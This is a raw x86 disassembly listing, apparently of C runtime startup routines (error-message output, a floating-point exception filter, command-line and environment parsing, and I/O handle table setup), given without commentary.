  422d74:	test   eax,eax
  422d76:	jne    0x422d8b
  422d78:	lea    eax,[ebp-0x10c]
  422d7e:	push   0x428484
  422d83:	push   eax
  422d84:	call   0x423c40
  422d89:	pop    ecx
  422d8a:	pop    ecx
  422d8b:	lea    eax,[ebp-0x10c]
  422d91:	push   eax
  422d92:	lea    edi,[ebp-0x10c]
  422d98:	call   0x423e70
  422d9d:	inc    eax
  422d9e:	cmp    eax,0x3c
  422da1:	pop    ecx
  422da2:	jbe    0x422dcd
  422da4:	lea    eax,[ebp-0x10c]
  422daa:	push   eax
  422dab:	call   0x423e70
  422db0:	mov    edi,eax
  422db2:	lea    eax,[ebp-0x10c]
  422db8:	sub    eax,0x3b
  422dbb:	push   0x3
  422dbd:	add    edi,eax
  422dbf:	push   0x428480
  422dc4:	push   edi
  422dc5:	call   0x423d40
  422dca:	add    esp,0x10
  422dcd:	push   edi
  422dce:	call   0x423e70
  422dd3:	push   DWORD PTR [esi+0x45c1cc]
  422dd9:	mov    ebx,eax
  422ddb:	call   0x423e70
  422de0:	lea    eax,[ebx+eax*1+0x1c]
  422de4:	pop    ecx
  422de5:	add    eax,0x3
  422de8:	pop    ecx
  422de9:	and    eax,0xfffffffc
  422dec:	call   0x4238b0
  422df1:	mov    ebx,esp
  422df3:	push   0x428464
  422df8:	push   ebx
  422df9:	call   0x423c40
  422dfe:	push   edi
  422dff:	push   ebx
  422e00:	call   0x423c50
  422e05:	push   0x428460
  422e0a:	push   ebx
  422e0b:	call   0x423c50
  422e10:	push   DWORD PTR [esi+0x45c1cc]
  422e16:	push   ebx
  422e17:	call   0x423c50
  422e1c:	push   0x12010
  422e21:	push   0x428438
  422e26:	push   ebx
  422e27:	call   0x423b42
  422e2c:	add    esp,0x2c
  422e2f:	jmp    0x422e56
  422e31:	push   edx
  422e32:	lea    eax,[ebp+0x8]
  422e35:	push   eax
  422e36:	lea    esi,[esi+0x45c1cc]
  422e3c:	push   DWORD PTR [esi]
  422e3e:	call   0x423e70
  422e43:	pop    ecx
  422e44:	push   eax
  422e45:	push   DWORD PTR [esi]
  422e47:	push   0xfffffff4
  422e49:	call   DWORD PTR ds:0x428038
  422e4f:	push   eax
  422e50:	call   DWORD PTR ds:0x428034
  422e56:	lea    esp,[ebp-0x118]
  422e5c:	mov    ecx,DWORD PTR [ebp-0x4]
  422e5f:	xor    ecx,DWORD PTR [ebp+0x4]
  422e62:	call   0x423f2c
  422e67:	pop    edi
  422e68:	pop    esi
  422e69:	pop    ebx
  422e6a:	leave  
  422e6b:	ret    
  422e6c:	mov    eax,ds:0x45cabc
  422e71:	cmp    eax,0x1
  422e74:	je     0x422e83
  422e76:	test   eax,eax
  422e78:	jne    0x422ea4
  422e7a:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422e81:	jne    0x422ea4
  422e83:	push   0xfc
  422e88:	call   0x422cf5
  422e8d:	mov    eax,ds:0x45cb08
  422e92:	test   eax,eax
  422e94:	pop    ecx
  422e95:	je     0x422e99
  422e97:	call   eax
  422e99:	push   0xff
  422e9e:	call   0x422cf5
  422ea3:	pop    ecx
  422ea4:	ret    
  422ea5:	push   ebp
  422ea6:	mov    ebp,esp
  422ea8:	push   ecx
  422ea9:	push   ebx
  422eaa:	push   esi
  422eab:	push   edi
  422eac:	call   0x42370d
  422eb1:	mov    edi,DWORD PTR [ebp+0x8]
  422eb4:	mov    esi,eax
  422eb6:	mov    edx,DWORD PTR [esi+0x54]
  422eb9:	mov    eax,ds:0x45c2dc
  422ebe:	mov    ecx,edx
  422ec0:	cmp    DWORD PTR [ecx],edi
  422ec2:	je     0x422ed1
  422ec4:	lea    ebx,[eax+eax*2]
  422ec7:	add    ecx,0xc
  422eca:	lea    ebx,[edx+ebx*4]
  422ecd:	cmp    ecx,ebx
  422ecf:	jb     0x422ec0
  422ed1:	lea    eax,[eax+eax*2]
  422ed4:	lea    eax,[edx+eax*4]
  422ed7:	cmp    ecx,eax
  422ed9:	jae    0x422edf
  422edb:	cmp    DWORD PTR [ecx],edi
  422edd:	je     0x422ee1
  422edf:	xor    ecx,ecx
  422ee1:	test   ecx,ecx
  422ee3:	je     0x422ffb
  422ee9:	mov    ebx,DWORD PTR [ecx+0x8]
  422eec:	test   ebx,ebx
  422eee:	mov    DWORD PTR [ebp+0x8],ebx
  422ef1:	je     0x422ffb
  422ef7:	cmp    ebx,0x5
  422efa:	jne    0x422f08
  422efc:	and    DWORD PTR [ecx+0x8],0x0
  422f00:	xor    eax,eax
  422f02:	inc    eax
  422f03:	jmp    0x423004
  422f08:	cmp    ebx,0x1
  422f0b:	je     0x422ff6
  422f11:	mov    eax,DWORD PTR [esi+0x58]
  422f14:	mov    DWORD PTR [ebp-0x4],eax
  422f17:	mov    eax,DWORD PTR [ebp+0xc]
  422f1a:	mov    DWORD PTR [esi+0x58],eax
  422f1d:	mov    eax,DWORD PTR [ecx+0x4]
  422f20:	cmp    eax,0x8
  422f23:	jne    0x422fe8
  422f29:	mov    edx,DWORD PTR ds:0x45c2d0
  422f2f:	mov    eax,ds:0x45c2d4
  422f34:	add    eax,edx
  422f36:	cmp    edx,eax
  422f38:	jge    0x422f61
  422f3a:	lea    eax,[edx+edx*2]
  422f3d:	shl    eax,0x2
  422f40:	mov    edi,DWORD PTR [esi+0x54]
  422f43:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f48:	mov    edi,DWORD PTR ds:0x45c2d0
  422f4e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422f54:	inc    edx
  422f55:	add    ebx,edi
  422f57:	add    eax,0xc
  422f5a:	cmp    edx,ebx
  422f5c:	jl     0x422f40
  422f5e:	mov    ebx,DWORD PTR [ebp+0x8]
  422f61:	mov    ecx,DWORD PTR [ecx]
  422f63:	cmp    ecx,0xc000008e
  422f69:	mov    edi,DWORD PTR [esi+0x5c]
  422f6c:	jne    0x422f77
  422f6e:	mov    DWORD PTR [esi+0x5c],0x83
  422f75:	jmp    0x422fdb
  422f77:	cmp    ecx,0xc0000090
  422f7d:	jne    0x422f88
  422f7f:	mov    DWORD PTR [esi+0x5c],0x81
  422f86:	jmp    0x422fdb
  422f88:	cmp    ecx,0xc0000091
  422f8e:	jne    0x422f99
  422f90:	mov    DWORD PTR [esi+0x5c],0x84
  422f97:	jmp    0x422fdb
  422f99:	cmp    ecx,0xc0000093
  422f9f:	jne    0x422faa
  422fa1:	mov    DWORD PTR [esi+0x5c],0x85
  422fa8:	jmp    0x422fdb
  422faa:	cmp    ecx,0xc000008d
  422fb0:	jne    0x422fbb
  422fb2:	mov    DWORD PTR [esi+0x5c],0x82
  422fb9:	jmp    0x422fdb
  422fbb:	cmp    ecx,0xc000008f
  422fc1:	jne    0x422fcc
  422fc3:	mov    DWORD PTR [esi+0x5c],0x86
  422fca:	jmp    0x422fdb
  422fcc:	cmp    ecx,0xc0000092
  422fd2:	jne    0x422fdb
  422fd4:	mov    DWORD PTR [esi+0x5c],0x8a
  422fdb:	push   DWORD PTR [esi+0x5c]
  422fde:	push   0x8
  422fe0:	call   ebx
  422fe2:	pop    ecx
  422fe3:	mov    DWORD PTR [esi+0x5c],edi
  422fe6:	jmp    0x422fef
  422fe8:	and    DWORD PTR [ecx+0x8],0x0
  422fec:	push   eax
  422fed:	call   ebx
  422fef:	mov    eax,DWORD PTR [ebp-0x4]
  422ff2:	pop    ecx
  422ff3:	mov    DWORD PTR [esi+0x58],eax
  422ff6:	or     eax,0xffffffff
  422ff9:	jmp    0x423004
  422ffb:	push   DWORD PTR [ebp+0xc]
  422ffe:	call   DWORD PTR ds:0x428040
  423004:	pop    edi
  423005:	pop    esi
  423006:	pop    ebx
  423007:	leave  
  423008:	ret    
  423009:	cmp    DWORD PTR ds:0x45d26c,0x0
  423010:	jne    0x423017
  423012:	call   0x42444c
  423017:	push   esi
  423018:	mov    esi,DWORD PTR ds:0x45d274
  42301e:	test   esi,esi
  423020:	jne    0x423029
  423022:	mov    esi,0x42849b
  423027:	jmp    0x42306e
  423029:	mov    al,BYTE PTR [esi]
  42302b:	cmp    al,0x22
  42302d:	jne    0x423057
  42302f:	inc    esi
  423030:	mov    al,BYTE PTR [esi]
  423032:	cmp    al,0x22
  423034:	je     0x423067
  423036:	test   al,al
  423038:	je     0x423050
  42303a:	movzx  eax,al
  42303d:	push   eax
  42303e:	call   0x423f6b
  423043:	test   eax,eax
  423045:	pop    ecx
  423046:	je     0x423049
  423048:	inc    esi
  423049:	inc    esi
  42304a:	mov    al,BYTE PTR [esi]
  42304c:	cmp    al,0x22
  42304e:	jne    0x423036
  423050:	cmp    BYTE PTR [esi],0x22
  423053:	jne    0x423068
  423055:	jmp    0x423067
  423057:	cmp    al,0x20
  423059:	jbe    0x423068
  42305b:	inc    esi
  42305c:	cmp    BYTE PTR [esi],0x20
  42305f:	ja     0x42305b
  423061:	jmp    0x423068
  423063:	cmp    al,0x20
  423065:	ja     0x42306e
  423067:	inc    esi
  423068:	mov    al,BYTE PTR [esi]
  42306a:	test   al,al
  42306c:	jne    0x423063
  42306e:	mov    eax,esi
  423070:	pop    esi
  423071:	ret    
  423072:	push   ebx
  423073:	xor    ebx,ebx
  423075:	cmp    DWORD PTR ds:0x45d26c,ebx
  42307b:	push   esi
  42307c:	push   edi
  42307d:	jne    0x423084
  42307f:	call   0x42444c
  423084:	mov    esi,DWORD PTR ds:0x45cab4
  42308a:	xor    edi,edi
  42308c:	cmp    esi,ebx
  42308e:	jne    0x4230a2
  423090:	jmp    0x4230c2
  423092:	cmp    al,0x3d
  423094:	je     0x423097
  423096:	inc    edi
  423097:	push   esi
  423098:	call   0x423e70
  42309d:	pop    ecx
  42309e:	lea    esi,[esi+eax*1+0x1]
  4230a2:	mov    al,BYTE PTR [esi]
  4230a4:	cmp    al,bl
  4230a6:	jne    0x423092
  4230a8:	lea    eax,[edi*4+0x4]
  4230af:	push   eax
  4230b0:	call   0x424582
  4230b5:	mov    edi,eax
  4230b7:	cmp    edi,ebx
  4230b9:	pop    ecx
  4230ba:	mov    DWORD PTR ds:0x45cae4,edi
  4230c0:	jne    0x4230c7
  4230c2:	or     eax,0xffffffff
  4230c5:	jmp    0x42311f
  4230c7:	mov    esi,DWORD PTR ds:0x45cab4
  4230cd:	push   ebp
  4230ce:	jmp    0x4230fa
  4230d0:	push   esi
  4230d1:	call   0x423e70
  4230d6:	mov    ebp,eax
  4230d8:	inc    ebp
  4230d9:	cmp    BYTE PTR [esi],0x3d
  4230dc:	pop    ecx
  4230dd:	je     0x4230f8
  4230df:	push   ebp
  4230e0:	call   0x424582
  4230e5:	cmp    eax,ebx
  4230e7:	pop    ecx
  4230e8:	mov    DWORD PTR [edi],eax
  4230ea:	je     0x423123
  4230ec:	push   esi
  4230ed:	push   eax
  4230ee:	call   0x423c40
  4230f3:	pop    ecx
  4230f4:	pop    ecx
  4230f5:	add    edi,0x4
  4230f8:	add    esi,ebp
  4230fa:	cmp    BYTE PTR [esi],bl
  4230fc:	jne    0x4230d0
  4230fe:	push   DWORD PTR ds:0x45cab4
  423104:	call   0x42446a
  423109:	mov    DWORD PTR ds:0x45cab4,ebx
  42310f:	mov    DWORD PTR [edi],ebx
  423111:	mov    DWORD PTR ds:0x45d260,0x1
  42311b:	xor    eax,eax
  42311d:	pop    ecx
  42311e:	pop    ebp
  42311f:	pop    edi
  423120:	pop    esi
  423121:	pop    ebx
  423122:	ret    
  423123:	push   DWORD PTR ds:0x45cae4
  423129:	call   0x42446a
  42312e:	mov    DWORD PTR ds:0x45cae4,ebx
  423134:	or     eax,0xffffffff
  423137:	jmp    0x42311d
  423139:	push   ebp
  42313a:	mov    ebp,esp
  42313c:	push   ecx
  42313d:	push   ebx
  42313e:	mov    ebx,DWORD PTR [ebp+0xc]
  423141:	xor    edx,edx
  423143:	cmp    DWORD PTR [ebp+0x8],edx
  423146:	push   edi
  423147:	mov    DWORD PTR [esi],edx
  423149:	mov    edi,ecx
  42314b:	mov    DWORD PTR [ebx],0x1
  423151:	je     0x42315c
  423153:	mov    ecx,DWORD PTR [ebp+0x8]
  423156:	add    DWORD PTR [ebp+0x8],0x4
  42315a:	mov    DWORD PTR [ecx],edi
  42315c:	cmp    BYTE PTR [eax],0x22
  42315f:	jne    0x42316f
  423161:	xor    ecx,ecx
  423163:	test   edx,edx
  423165:	sete   cl
  423168:	inc    eax
  423169:	mov    edx,ecx
  42316b:	mov    cl,0x22
  42316d:	jmp    0x42319c
  42316f:	inc    DWORD PTR [esi]
  423171:	test   edi,edi
  423173:	je     0x42317a
  423175:	mov    cl,BYTE PTR [eax]
  423177:	mov    BYTE PTR [edi],cl
  423179:	inc    edi
  42317a:	mov    cl,BYTE PTR [eax]
  42317c:	movzx  ebx,cl
  42317f:	inc    eax
  423180:	test   BYTE PTR [ebx+0x45cf21],0x4
  423187:	je     0x423195
  423189:	inc    DWORD PTR [esi]
  42318b:	test   edi,edi
  42318d:	je     0x423194
  42318f:	mov    bl,BYTE PTR [eax]
  423191:	mov    BYTE PTR [edi],bl
  423193:	inc    edi
  423194:	inc    eax
  423195:	test   cl,cl
  423197:	mov    ebx,DWORD PTR [ebp+0xc]
  42319a:	je     0x4231ce
  42319c:	test   edx,edx
  42319e:	jne    0x42315c
  4231a0:	cmp    cl,0x20
  4231a3:	je     0x4231aa
  4231a5:	cmp    cl,0x9
  4231a8:	jne    0x42315c
  4231aa:	test   edi,edi
  4231ac:	je     0x4231b2
  4231ae:	and    BYTE PTR [edi-0x1],0x0
  4231b2:	and    DWORD PTR [ebp-0x4],0x0
  4231b6:	cmp    BYTE PTR [eax],0x0
  4231b9:	je     0x423295
  4231bf:	mov    cl,BYTE PTR [eax]
  4231c1:	cmp    cl,0x20
  4231c4:	je     0x4231cb
  4231c6:	cmp    cl,0x9
  4231c9:	jne    0x4231d1
  4231cb:	inc    eax
  4231cc:	jmp    0x4231bf
  4231ce:	dec    eax
  4231cf:	jmp    0x4231b2
  4231d1:	cmp    BYTE PTR [eax],0x0
  4231d4:	je     0x423295
  4231da:	cmp    DWORD PTR [ebp+0x8],0x0
  4231de:	je     0x4231e9
  4231e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4231e3:	add    DWORD PTR [ebp+0x8],0x4
  4231e7:	mov    DWORD PTR [ecx],edi
  4231e9:	inc    DWORD PTR [ebx]
  4231eb:	xor    ebx,ebx
  4231ed:	inc    ebx
  4231ee:	xor    edx,edx
  4231f0:	jmp    0x4231f4
  4231f2:	inc    eax
  4231f3:	inc    edx
  4231f4:	cmp    BYTE PTR [eax],0x5c
  4231f7:	je     0x4231f2
  4231f9:	cmp    BYTE PTR [eax],0x22
  4231fc:	jne    0x423224
  4231fe:	test   dl,0x1
  423201:	jne    0x423222
  423203:	cmp    DWORD PTR [ebp-0x4],0x0
  423207:	je     0x423215
  423209:	lea    ecx,[eax+0x1]
  42320c:	cmp    BYTE PTR [ecx],0x22
  42320f:	jne    0x423215
  423211:	mov    eax,ecx
  423213:	jmp    0x423217
  423215:	xor    ebx,ebx
  423217:	xor    ecx,ecx
  423219:	cmp    DWORD PTR [ebp-0x4],ecx
  42321c:	sete   cl
  42321f:	mov    DWORD PTR [ebp-0x4],ecx
  423222:	shr    edx,1
  423224:	test   edx,edx
  423226:	je     0x423235
  423228:	test   edi,edi
  42322a:	je     0x423230
  42322c:	mov    BYTE PTR [edi],0x5c
  42322f:	inc    edi
  423230:	inc    DWORD PTR [esi]
  423232:	dec    edx
  423233:	jne    0x423228
  423235:	mov    cl,BYTE PTR [eax]
  423237:	test   cl,cl
  423239:	je     0x423283
  42323b:	cmp    DWORD PTR [ebp-0x4],0x0
  42323f:	jne    0x42324b
  423241:	cmp    cl,0x20
  423244:	je     0x423283
  423246:	cmp    cl,0x9
  423249:	je     0x423283
  42324b:	test   ebx,ebx
  42324d:	je     0x42327d
  42324f:	test   edi,edi
  423251:	je     0x42326c
  423253:	movzx  edx,cl
  423256:	test   BYTE PTR [edx+0x45cf21],0x4
  42325d:	je     0x423265
  42325f:	mov    BYTE PTR [edi],cl
  423261:	inc    edi
  423262:	inc    eax
  423263:	inc    DWORD PTR [esi]
  423265:	mov    cl,BYTE PTR [eax]
  423267:	mov    BYTE PTR [edi],cl
  423269:	inc    edi
  42326a:	jmp    0x42327b
  42326c:	movzx  ecx,cl
  42326f:	test   BYTE PTR [ecx+0x45cf21],0x4
  423276:	je     0x42327b
  423278:	inc    eax
  423279:	inc    DWORD PTR [esi]
  42327b:	inc    DWORD PTR [esi]
  42327d:	inc    eax
  42327e:	jmp    0x4231eb
  423283:	test   edi,edi
  423285:	je     0x42328b
  423287:	and    BYTE PTR [edi],0x0
  42328a:	inc    edi
  42328b:	inc    DWORD PTR [esi]
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	jmp    0x4231b6
  423295:	mov    eax,DWORD PTR [ebp+0x8]
  423298:	test   eax,eax
  42329a:	je     0x42329f
  42329c:	and    DWORD PTR [eax],0x0
  42329f:	inc    DWORD PTR [ebx]
  4232a1:	pop    edi
  4232a2:	pop    ebx
  4232a3:	leave  
  4232a4:	ret    
  4232a5:	push   ebp
  4232a6:	mov    ebp,esp
  4232a8:	push   ecx
  4232a9:	push   ecx
  4232aa:	push   ebx
  4232ab:	push   esi
  4232ac:	push   edi
  4232ad:	xor    edi,edi
  4232af:	cmp    DWORD PTR ds:0x45d26c,edi
  4232b5:	jne    0x4232bc
  4232b7:	call   0x42444c
  4232bc:	and    BYTE PTR ds:0x45cc14,0x0
  4232c3:	push   0x104
  4232c8:	mov    esi,0x45cb10
  4232cd:	push   esi
  4232ce:	push   edi
  4232cf:	call   DWORD PTR ds:0x42803c
  4232d5:	mov    eax,ds:0x45d274
  4232da:	cmp    eax,edi
  4232dc:	mov    DWORD PTR ds:0x45caf4,esi
  4232e2:	je     0x4232eb
  4232e4:	cmp    BYTE PTR [eax],0x0
  4232e7:	mov    ebx,eax
  4232e9:	jne    0x4232ed
  4232eb:	mov    ebx,esi
  4232ed:	lea    eax,[ebp-0x4]
  4232f0:	push   eax
  4232f1:	push   edi
  4232f2:	lea    esi,[ebp-0x8]
  4232f5:	xor    ecx,ecx
  4232f7:	mov    eax,ebx
  4232f9:	call   0x423139
  4232fe:	mov    esi,DWORD PTR [ebp-0x4]
  423301:	mov    eax,DWORD PTR [ebp-0x8]
  423304:	shl    esi,0x2
  423307:	add    eax,esi
  423309:	push   eax
  42330a:	call   0x424582
  42330f:	mov    edi,eax
  423311:	add    esp,0xc
  423314:	test   edi,edi
  423316:	jne    0x42331d
  423318:	or     eax,0xffffffff
  42331b:	jmp    0x423342
  42331d:	lea    eax,[ebp-0x4]
  423320:	push   eax
  423321:	lea    ecx,[esi+edi*1]
  423324:	push   edi
  423325:	lea    esi,[ebp-0x8]
  423328:	mov    eax,ebx
  42332a:	call   0x423139
  42332f:	mov    eax,DWORD PTR [ebp-0x4]
  423332:	dec    eax
  423333:	pop    ecx
  423334:	mov    ds:0x45cad8,eax
  423339:	pop    ecx
  42333a:	mov    DWORD PTR ds:0x45cadc,edi
  423340:	xor    eax,eax
  423342:	pop    edi
  423343:	pop    esi
  423344:	pop    ebx
  423345:	leave  
  423346:	ret    
  423347:	push   ecx
  423348:	push   ecx
  423349:	mov    eax,ds:0x45cc18
  42334e:	push   ebx
  42334f:	push   ebp
  423350:	push   esi
  423351:	push   edi
  423352:	mov    edi,DWORD PTR ds:0x428054
  423358:	xor    ebx,ebx
  42335a:	xor    esi,esi
  42335c:	cmp    eax,ebx
  42335e:	push   0x2
  423360:	pop    ebp
  423361:	jne    0x423390
  423363:	call   edi
  423365:	mov    esi,eax
  423367:	cmp    esi,ebx
  423369:	je     0x423377
  42336b:	mov    DWORD PTR ds:0x45cc18,0x1
  423375:	jmp    0x423395
  423377:	call   DWORD PTR ds:0x428010
  42337d:	cmp    eax,0x78
  423380:	jne    0x42338b
  423382:	mov    eax,ebp
  423384:	mov    ds:0x45cc18,eax
  423389:	jmp    0x423390
  42338b:	mov    eax,ds:0x45cc18
  423390:	cmp    eax,0x1
  423393:	jne    0x423412
  423395:	cmp    esi,ebx
  423397:	jne    0x4233a1
  423399:	call   edi
  42339b:	mov    esi,eax
  42339d:	cmp    esi,ebx
  42339f:	je     0x42341a
  4233a1:	cmp    WORD PTR [esi],bx
  4233a4:	mov    eax,esi
  4233a6:	je     0x4233b6
  4233a8:	add    eax,ebp
  4233aa:	cmp    WORD PTR [eax],bx
  4233ad:	jne    0x4233a8
  4233af:	add    eax,ebp
  4233b1:	cmp    WORD PTR [eax],bx
  4233b4:	jne    0x4233a8
  4233b6:	mov    edi,DWORD PTR ds:0x428050
  4233bc:	push   ebx
  4233bd:	push   ebx
  4233be:	push   ebx
  4233bf:	sub    eax,esi
  4233c1:	push   ebx
  4233c2:	sar    eax,1
  4233c4:	inc    eax
  4233c5:	push   eax
  4233c6:	push   esi
  4233c7:	push   ebx
  4233c8:	push   ebx
  4233c9:	mov    DWORD PTR [esp+0x34],eax
  4233cd:	call   edi
  4233cf:	mov    ebp,eax
  4233d1:	cmp    ebp,ebx
  4233d3:	je     0x423407
  4233d5:	push   ebp
  4233d6:	call   0x424582
  4233db:	cmp    eax,ebx
  4233dd:	pop    ecx
  4233de:	mov    DWORD PTR [esp+0x10],eax
  4233e2:	je     0x423407
  4233e4:	push   ebx
  4233e5:	push   ebx
  4233e6:	push   ebp
  4233e7:	push   eax
  4233e8:	push   DWORD PTR [esp+0x24]
  4233ec:	push   esi
  4233ed:	push   ebx
  4233ee:	push   ebx
  4233ef:	call   edi
  4233f1:	test   eax,eax
  4233f3:	jne    0x423403
  4233f5:	push   DWORD PTR [esp+0x10]
  4233f9:	call   0x42446a
  4233fe:	pop    ecx
  4233ff:	mov    DWORD PTR [esp+0x10],ebx
  423403:	mov    ebx,DWORD PTR [esp+0x10]
  423407:	push   esi
  423408:	call   DWORD PTR ds:0x42804c
  42340e:	mov    eax,ebx
  423410:	jmp    0x423462
  423412:	cmp    eax,ebp
  423414:	je     0x42341e
  423416:	cmp    eax,ebx
  423418:	je     0x42341e
  42341a:	xor    eax,eax
  42341c:	jmp    0x423462
  42341e:	call   DWORD PTR ds:0x428048
  423424:	mov    esi,eax
  423426:	cmp    esi,ebx
  423428:	je     0x42341a
  42342a:	cmp    BYTE PTR [esi],bl
  42342c:	je     0x423438
  42342e:	inc    eax
  42342f:	cmp    BYTE PTR [eax],bl
  423431:	jne    0x42342e
  423433:	inc    eax
  423434:	cmp    BYTE PTR [eax],bl
  423436:	jne    0x42342e
  423438:	sub    eax,esi
  42343a:	inc    eax
  42343b:	mov    ebp,eax
  42343d:	push   ebp
  42343e:	call   0x424582
  423443:	mov    edi,eax
  423445:	cmp    edi,ebx
  423447:	pop    ecx
  423448:	jne    0x42344e
  42344a:	xor    edi,edi
  42344c:	jmp    0x423459
  42344e:	push   ebp
  42344f:	push   esi
  423450:	push   edi
  423451:	call   0x4245a0
  423456:	add    esp,0xc
  423459:	push   esi
  42345a:	call   DWORD PTR ds:0x428044
  423460:	mov    eax,edi
  423462:	pop    edi
  423463:	pop    esi
  423464:	pop    ebp
  423465:	pop    ebx
  423466:	pop    ecx
  423467:	pop    ecx
  423468:	ret    
  423469:	sub    esp,0x48
  42346c:	push   ebx
  42346d:	mov    ebx,0x480
  423472:	push   ebx
  423473:	call   0x424582
  423478:	test   eax,eax
  42347a:	pop    ecx
  42347b:	jne    0x423485
  42347d:	or     eax,0xffffffff
  423480:	jmp    0x423662
  423485:	mov    ds:0x45d160,eax
  42348a:	mov    DWORD PTR ds:0x45d148,0x20
  423494:	lea    ecx,[eax+0x480]
  42349a:	jmp    0x4234ba
  42349c:	and    BYTE PTR [eax+0x4],0x0
  4234a0:	or     DWORD PTR [eax],0xffffffff
  4234a3:	and    DWORD PTR [eax+0x8],0x0
  4234a7:	mov    BYTE PTR [eax+0x5],0xa
  4234ab:	mov    ecx,DWORD PTR ds:0x45d160
  4234b1:	add    eax,0x24
  4234b4:	add    ecx,0x480
  4234ba:	cmp    eax,ecx
  4234bc:	jb     0x42349c
  4234be:	push   ebp
  4234bf:	push   esi
  4234c0:	push   edi
  4234c1:	lea    eax,[esp+0x14]
  4234c5:	push   eax
  4234c6:	call   DWORD PTR ds:0x42801c
  4234cc:	cmp    WORD PTR [esp+0x46],0x0
  4234d2:	je     0x4235c1
  4234d8:	mov    eax,DWORD PTR [esp+0x48]
  4234dc:	test   eax,eax
  4234de:	je     0x4235c1
  4234e4:	mov    edi,DWORD PTR [eax]
  4234e6:	lea    ebp,[eax+0x4]
  4234e9:	lea    eax,[edi+ebp*1]
  4234ec:	mov    DWORD PTR [esp+0x10],eax
  4234f0:	mov    eax,0x800
  4234f5:	cmp    edi,eax
  4234f7:	jl     0x4234fb
  4234f9:	mov    edi,eax
  4234fb:	cmp    DWORD PTR ds:0x45d148,edi
  423501:	jge    0x423551
  423503:	mov    esi,0x45d164
  423508:	push   ebx
  423509:	call   0x424582
  42350e:	test   eax,eax
  423510:	pop    ecx
  423511:	je     0x42354b
  423513:	add    DWORD PTR ds:0x45d148,0x20
  42351a:	mov    DWORD PTR [esi],eax
  42351c:	lea    ecx,[eax+0x480]
  423522:	jmp    0x42353a
  423524:	and    BYTE PTR [eax+0x4],0x0
  423528:	or     DWORD PTR [eax],0xffffffff
  42352b:	and    DWORD PTR [eax+0x8],0x0
  42352f:	mov    BYTE PTR [eax+0x5],0xa
  423533:	mov    ecx,DWORD PTR [esi]
  423535:	add    eax,0x24
  423538:	add    ecx,ebx
  42353a:	cmp    eax,ecx
  42353c:	jb     0x423524
  42353e:	add    esi,0x4
  423541:	cmp    DWORD PTR ds:0x45d148,edi
  423547:	jl     0x423508
  423549:	jmp    0x423551
  42354b:	mov    edi,DWORD PTR ds:0x45d148
  423551:	xor    ebx,ebx
  423553:	test   edi,edi
  423555:	jle    0x4235c1
  423557:	mov    eax,DWORD PTR [esp+0x10]
  42355b:	mov    eax,DWORD PTR [eax]
  42355d:	cmp    eax,0xffffffff
  423560:	je     0x4235b6
  423562:	mov    cl,BYTE PTR [ebp+0x0]
  423565:	test   cl,0x1
  423568:	je     0x4235b6
  42356a:	test   cl,0x8
  42356d:	jne    0x42357a
  42356f:	push   eax
  423570:	call   DWORD PTR ds:0x42805c
  423576:	test   eax,eax
  423578:	je     0x4235b6
  42357a:	mov    ecx,ebx
  42357c:	mov    eax,ebx
  42357e:	and    eax,0x1f
  423581:	lea    eax,[eax+eax*8]
  423584:	sar    ecx,0x5
  423587:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  42358e:	lea    esi,[ecx+eax*4]
  423591:	mov    eax,DWORD PTR [esp+0x10]
  423595:	mov    eax,DWORD PTR [eax]
  423597:	mov    DWORD PTR [esi],eax
  423599:	mov    al,BYTE PTR [ebp+0x0]
  42359c:	mov    BYTE PTR [esi+0x4],al
  42359f:	lea    eax,[esi+0xc]
  4235a2:	push   0xfa0
  4235a7:	push   eax
  4235a8:	call   0x4248ed
  4235ad:	test   eax,eax
  4235af:	pop    ecx
  4235b0:	pop    ecx
  4235b1:	je     0x4235e1
  4235b3:	inc    DWORD PTR [esi+0x8]
  4235b6:	add    DWORD PTR [esp+0x10],0x4
  4235bb:	inc    ebx
  4235bc:	inc    ebp
  4235bd:	cmp    ebx,edi
  4235bf:	jl     0x423557
  4235c1:	xor    ebx,ebx
  4235c3:	mov    ecx,DWORD PTR ds:0x45d160
  4235c9:	lea    eax,[ebx+ebx*8]
  4235cc:	lea    esi,[ecx+eax*4]
  4235cf:	cmp    DWORD PTR [esi],0xffffffff
  4235d2:	jne    0x423643
  4235d4:	test   ebx,ebx
  4235d6:	mov    BYTE PTR [esi+0x4],0x81
  4235da:	jne    0x4235e6
  4235dc:	push   0xfffffff6
  4235de:	pop    eax
  4235df:	jmp    0x4235f0
  4235e1:	or     eax,0xffffffff
  4235e4:	jmp    0x42365f
  4235e6:	mov    eax,ebx
  4235e8:	dec    eax
  4235e9:	neg    eax
  4235eb:	sbb    eax,eax
  4235ed:	add    eax,0xfffffff5
  4235f0:	push   eax
  4235f1:	call   DWORD PTR ds:0x428038
  4235f7:	mov    edi,eax
  4235f9:	cmp    edi,0xffffffff
  4235fc:	je     0x42363d
  4235fe:	push   edi
  4235ff:	call   DWORD PTR ds:0x42805c
  423605:	test   eax,eax
  423607:	je     0x42363d
  423609:	and    eax,0xff
  42360e:	cmp    eax,0x2
  423611:	mov    DWORD PTR [esi],edi
  423613:	jne    0x42361b
  423615:	or     BYTE PTR [esi+0x4],0x40
  423619:	jmp    0x423624
  42361b:	cmp    eax,0x3
  42361e:	jne    0x423624
  423620:	or     BYTE PTR [esi+0x4],0x8
  423624:	lea    eax,[esi+0xc]
  423627:	push   0xfa0
  42362c:	push   eax
  42362d:	call   0x4248ed
  423632:	test   eax,eax
  423634:	pop    ecx
  423635:	pop    ecx
  423636:	je     0x4235e1
  423638:	inc    DWORD PTR [esi+0x8]
  42363b:	jmp    0x423647
  42363d:	or     BYTE PTR [esi+0x4],0x40
  423641:	jmp    0x423647
  423643:	or     BYTE PTR [esi+0x4],0x80
  423647:	inc    ebx
  423648:	cmp    ebx,0x3
  42364b:	jl     0x4235c3
  423651:	push   DWORD PTR ds:0x45d148
  423657:	call   DWORD PTR ds:0x428058
  42365d:	xor    eax,eax
  42365f:	pop    edi
  423660:	pop    esi
  423661:	pop    ebp
  423662:	pop    ebx
  423663:	add    esp,0x48
  423666:	ret    
  423667:	push   0xc
  423669:	push   0x4284a0
  42366e:	call   0x423858
  423673:	mov    DWORD PTR [ebp-0x1c],0x428ef8
  42367a:	cmp    DWORD PTR [ebp-0x1c],0x428ef8
  423681:	jae    0x4236a5
  423683:	and    DWORD PTR [ebp-0x4],0x0
